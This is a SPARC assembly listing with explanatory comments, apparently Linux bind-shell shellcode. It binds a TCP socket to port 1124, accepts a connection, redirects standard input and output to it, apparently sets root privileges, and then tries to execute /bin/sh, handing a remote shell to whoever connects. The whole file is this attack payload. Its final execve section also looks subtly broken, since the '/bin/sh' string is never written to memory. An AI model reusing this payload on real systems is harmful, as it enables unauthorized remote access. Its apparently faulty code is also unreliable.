    .align 4                  ! we align the code
    .global _start

    _start:

      save %sp, -136, %sp     ! reserve space in stack

      mov 0x2, %o0            ! AF_INET
      mov 0x1, %o1            ! SOCK_STREAM
      xor %o2, %o2, %o2       ! protocol
      st %o0, [ %sp + 0x44 ]
      st %o1, [ %sp + 0x48 ]
      st %o2, [ %sp + 0x4c ]  ! we prepared the arguments in the stack
      mov 0x1, %o0            ! value from socket() for socketcall()
      add %sp, 0x44, %o1      ! we indicate in o1 the address of arguments
      mov 0xce, %g1           ! 0xce = 206 = socketcall
      ta 0x10                 ! equivalent of int 0x80, trap to the syscall
      st %o0, [ %fp -4 ]      ! store socket
      mov 0x2, %o0            ! we start creating sockaddr_in
      sth %o0, [ %fp -24 ]    ! sin_family = 2 (AF_INET) in the stack
      mov 0x464, %o0          ! sin_port = 1124 (remember, big-endian)
      sth %o0, [ %fp -22 ]    ! we put sin_port in the stack
      clr [ %fp -20 ]         ! we push sin_addr (INADDR_ANY) to the stack
      ld [ %fp -4 ], %o0      ! we get back the socket
      add %fp, -24, %o1       ! we prepare the beginning of the struct
      mov 0x10, %o2           ! sizeof struct
      st %o0, [ %sp + 0x44 ]  ! we point to socket
      st %o1, [ %sp + 0x48 ]  ! we point address of sockaddr_in
      st %o2, [ %sp + 0x4c ]  ! we add the size of struct (16)
      mov 0x2, %o0            ! we tell socketcall() what we want to bind
      add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
      mov 0xce, %g1           ! 0xce = 206 = socketcall
      ta 0x10                 ! we execute the trap
      ld [ %fp - 4 ], %o0     ! we get back the socket as a returned value
      mov 0x1, %o1            ! backlog of 1, but we can increase this value
      st %o0, [ %sp + 0x44 ]  ! socket
      st %o1, [ %sp + 0x48 ]  ! backlog
      mov 0x4, %o0            ! listen()
      add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
      mov 0xce, %g1           ! 0xce = 206 = socketcall
      ta 0x10
      ld [ %fp - 4 ], %o0     ! we get back the socket as a returned value
      add %fp, -24, %o1       ! we get back sockaddr_in
      add %fp, -4, %o2
      st %o0, [ %sp + 0x44 ]  ! socket
      st %o1, [ %sp + 0x48 ]  ! struct
      st %o2, [ %sp + 0x4c ]  ! len
      mov 0x5, %o0            ! accept()
      add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
      mov 0xce, %g1           ! 0xce = 206 = socketcall
      ta 0x10                 ! trap
      st %o0, [ %fp - 8 ]     ! new socket
      ld [ %fp - 8], %o0      ! place it as argument
      xor %o1, %o1, %o1       ! stdin
      mov 0x5a, %g1           !
      ta 0x10                 ! trap
      ld [ %fp - 8], %o0      !
      mov 0x1, %o1            ! stdout
      mov 0x5a, %g1           !
      ta 0x10                 ! trap
      ld [ %fp - 8], %o0      !
      mov 0x2, %o1            ! stderr
      mov 0x5a, %g1           !
      ta 0x10                 ! and... trap
      xor %o1, %o1, %o0
      xor %o1, %o1, %o1
      mov 0x7e, %g1
      ta 0x10
      sethi   %hi(0x2F62696E), %l0
      or      %l0, %lo(0x2F62696E), %l0
      sethi   %hi(0x2F736800), %l1
      and     %sp, %sp, %o0
      xor     %o1, %o1, %o1
      mov     0xb, %g1
      ta      0x10
